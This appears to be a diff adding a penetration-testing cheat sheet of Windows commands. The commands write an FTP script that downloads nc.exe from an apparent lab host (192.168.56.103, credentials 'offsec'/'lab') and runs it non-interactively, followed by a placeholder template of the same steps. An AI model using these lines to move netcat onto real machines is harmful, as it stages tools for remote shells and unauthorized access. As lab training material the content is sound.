@@ -1,0 +1,16 @@
+echo open 192.168.56.103 21 > ftp.txt
+echo offsec >> ftp.txt
+echo lab >> ftp.txt
+echo bin >> ftp.txt
+echo GET nc.exe >> ftp.txt
+echo bye >> ftp.txt
+ftp -s:ftp.txt
+
+
+echo open 192.168.56.103 21 > ftp.txt
+echo [ftpuser] >> ftp.txt
+echo [password] >> ftp.txt
+echo bin >> ftp.txt
+echo GET [file] >> ftp.txt
+echo bye >> ftp.txt
+ftp -s:ftp.txt
